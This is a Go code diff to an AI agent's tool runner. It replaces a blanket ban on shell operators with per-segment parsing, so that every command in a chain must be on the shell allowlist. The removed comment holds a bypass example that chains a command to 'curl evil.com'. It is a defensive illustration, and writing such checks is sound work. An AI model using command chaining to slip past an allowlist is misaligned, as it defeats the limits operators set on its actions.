@@ -200,21 +200,33 @@ func (r *ToolRunner) enforcePolicy(name string, args map[string]any) (map[string
 			return nil, err
 		}
 		if len(r.agent.Policies.ShellAllowlist) > 0 {
-			if containsShellOperators(command) {
-				slog.Warn("tool_runner: exec denied - shell operators detected",
+			segments, err := splitAllowlistSegments(command)
+			if err != nil {
+				slog.Warn("tool_runner: exec denied - unsupported shell syntax in allowlist mode",
 					"command", command,
+					"error", err,
 				)
-				return nil, &PolicyError{Message: "exec denied: command contains shell operators (;, |, &&, ||, `, $(), newline, &) which bypass allowlist; use a single command"}
+				return nil, &PolicyError{Message: fmt.Sprintf("exec denied: %s", err.Error())}
 			}
-			bin := extractCommandBinary(command)
-			if !isInAllowlist(bin, r.agent.Policies.ShellAllowlist) {
-				slog.Warn("tool_runner: exec denied - binary not in allowlist",
-					"binary", bin,
-					"allowlist", r.agent.Policies.ShellAllowlist,
-				)
-				return nil, &PolicyError{Message: fmt.Sprintf("exec denied: command %q is not in shell_allowlist", bin)}
+			for _, segment := range segments {
+				bin, err := extractCommandBinaryFromSegment(segment)
+				if err != nil {
+					slog.Warn("tool_runner: exec denied - unable to resolve binary in segment",
+						"segment", segment,
+						"error", err,
+					)
+					return nil, &PolicyError{Message: "exec denied: unable to resolve executable from command segment"}
+				}
+				if !isInAllowlist(bin, r.agent.Policies.ShellAllowlist) {
+					slog.Warn("tool_runner: exec denied - binary not in allowlist",
+						"binary", bin,
+						"segment", segment,
+						"allowlist", r.agent.Policies.ShellAllowlist,
+					)
+					return nil, &PolicyError{Message: fmt.Sprintf("exec denied: command %q is not in shell_allowlist", bin)}
+				}
+				slog.Debug("tool_runner: exec segment allowed via allowlist", "binary", bin, "segment", segment)
 			}
-			slog.Debug("tool_runner: exec allowed via allowlist", "binary", bin)
 		}
 		workdir := r.agent.Workspace
 		if rawWorkdir, ok := optionalStringArg(out, "workdir"); ok && rawWorkdir != "" {
@@ -342,33 +354,246 @@ func isInAllowlist(command string, allowlist []string) bool {
 	return false
 }
 
-// containsShellOperators reports whether the command contains operators that could
-// invoke additional commands beyond the first word. Used when shell_allowlist is
-// active to prevent bypasses (e.g. "echo ok; curl evil.com").
-func containsShellOperators(command string) bool {
-	if strings.Contains(command, ";") ||
-		strings.Contains(command, "|") ||
-		strings.Contains(command, "&&") ||
-		strings.Contains(command, "||") ||
-		strings.Contains(command, "`") ||
-		strings.Contains(command, "$(") ||
-		strings.Contains(command, "\n") ||
-		strings.Contains(command, " & ") {
-		return true
+func splitAllowlistSegments(command string) ([]string, error) {
+	trimmed := strings.TrimSpace(command)
+	if trimmed == "" {
+		return nil, fmt.Errorf("command is required")
 	}
-	// "cmd &" (background)
-	if strings.HasSuffix(strings.TrimRight(command, " \t"), "&") {
-		return true
+
+	segments := make([]string, 0, 4)
+	var segment strings.Builder
+
+	pushSegment := func() error {
+		part := strings.TrimSpace(segment.String())
+		segment.Reset()
+		if part == "" {
+			return fmt.Errorf("malformed shell command")
+		}
+		segments = append(segments, part)
+		return nil
 	}
-	return false
+
+	inSingle := false
+	inDouble := false
+	escaped := false
+	for i := 0; i < len(trimmed); i++ {
+		ch := trimmed[i]
+		next := byte(0)
+		if i+1 < len(trimmed) {
+			next = trimmed[i+1]
+		}
+
+		if escaped {
+			segment.WriteByte(ch)
+			escaped = false
+			continue
+		}
+
+		if inSingle {
+			if ch == '\'' {
+				inSingle = false
+			}
+			segment.WriteByte(ch)
+			continue
+		}
+
+		if inDouble {
+			if ch == '\\' {
+				segment.WriteByte(ch)
+				if next != 0 {
+					segment.WriteByte(next)
+					i++
+				}
+				continue
+			}
+			if ch == '"' {
+				inDouble = false
+				segment.WriteByte(ch)
+				continue
+			}
+			if ch == '`' || (ch == '$' && next == '(') {
+				return nil, fmt.Errorf("command substitution is not supported in shell_allowlist mode")
+			}
+			segment.WriteByte(ch)
+			continue
+		}
+
+		switch ch {
+		case '\\':
+			escaped = true
+			segment.WriteByte(ch)
+			continue
+		case '\'':
+			inSingle = true
+			segment.WriteByte(ch)
+			continue
+		case '"':
+			inDouble = true
+			segment.WriteByte(ch)
+			continue
+		case '`':
+			return nil, fmt.Errorf("command substitution is not supported in shell_allowlist mode")
+		case '$':
+			if next == '(' {
+				return nil, fmt.Errorf("command substitution is not supported in shell_allowlist mode")
+			}
+		case '<', '>':
+			return nil, fmt.Errorf("redirections are not supported in shell_allowlist mode")
+		case '\n', '\r':
+			return nil, fmt.Errorf("newlines are not supported in shell_allowlist mode")
+		case '&':
+			if next == '&' {
+				if err := pushSegment(); err != nil {
+					return nil, err
+				}
+				i++
+				continue
+			}
+			return nil, fmt.Errorf("background commands are not supported in shell_allowlist mode")
+		case '|':
+			if next == '|' {
+				if err := pushSegment(); err != nil {
+					return nil, err
+				}
+				i++
+				continue
+			}
+			if err := pushSegment(); err != nil {
+				return nil, err
+			}
+			continue
+		case ';':
+			if err := pushSegment(); err != nil {
+				return nil, err
+			}
+			continue
+		case '(', ')':
+			return nil, fmt.Errorf("subshell grouping is not supported in shell_allowlist mode")
+		}
+
+		segment.WriteByte(ch)
+	}
+
+	if escaped || inSingle || inDouble {
+		return nil, fmt.Errorf("malformed shell command")
+	}
+	if err := pushSegment(); err != nil {
+		return nil, err
+	}
+	return segments, nil
 }
 
-func extractCommandBinary(command string) string {
-	fields := strings.Fields(command)
-	if len(fields) == 0 {
-		return command
+func extractCommandBinaryFromSegment(segment string) (string, error) {
+	args, err := splitShellArgs(segment)
+	if err != nil {
+		return "", err
 	}
-	return filepath.Base(fields[0])
+	for _, arg := range args {
+		if isShellEnvAssignment(arg) {
+			continue
+		}
+		return filepath.Base(arg), nil
+	}
+	return "", fmt.Errorf("no executable in segment")
+}
+
+func splitShellArgs(command string) ([]string, error) {
+	var (
+		args     []string
+		current  strings.Builder
+		inSingle bool
+		inDouble bool
+		escaped  bool
+	)
+
+	pushArg := func() {
+		if current.Len() == 0 {
+			return
+		}
+		args = append(args, current.String())
+		current.Reset()
+	}
+
+	for i := 0; i < len(command); i++ {
+		ch := command[i]
+		next := byte(0)
+		if i+1 < len(command) {
+			next = command[i+1]
+		}
+
+		if escaped {
+			current.WriteByte(ch)
+			escaped = false
+			continue
+		}
+		if inSingle {
+			if ch == '\'' {
+				inSingle = false
+				continue
+			}
+			current.WriteByte(ch)
+			continue
+		}
+		if inDouble {
+			if ch == '"' {
+				inDouble = false
+				continue
+			}
+			if ch == '\\' {
+				if next != 0 {
+					current.WriteByte(next)
+					i++
+					continue
+				}
+				return nil, fmt.Errorf("malformed shell command")
+			}
+			current.WriteByte(ch)
+			continue
+		}
+
+		switch ch {
+		case '\\':
+			escaped = true
+		case '\'':
+			inSingle = true
+		case '"':
+			inDouble = true
+		case ' ', '\t':
+			pushArg()
+		default:
+			current.WriteByte(ch)
+		}
+	}
+
+	if escaped || inSingle || inDouble {
+		return nil, fmt.Errorf("malformed shell command")
+	}
+	pushArg()
+	return args, nil
+}
+
+func isShellEnvAssignment(token string) bool {
+	if token == "" {
+		return false
+	}
+	eq := strings.IndexByte(token, '=')
+	if eq <= 0 {
+		return false
+	}
+	key := token[:eq]
+	for i := 0; i < len(key); i++ {
+		c := key[i]
+		if i == 0 {
+			if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c == '_') {
+				return false
+			}
+			continue
+		}
+		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
+			return false
+		}
+	}
+	return true
 }
 
 func domainAllowed(target string, allowDomains []string) bool {
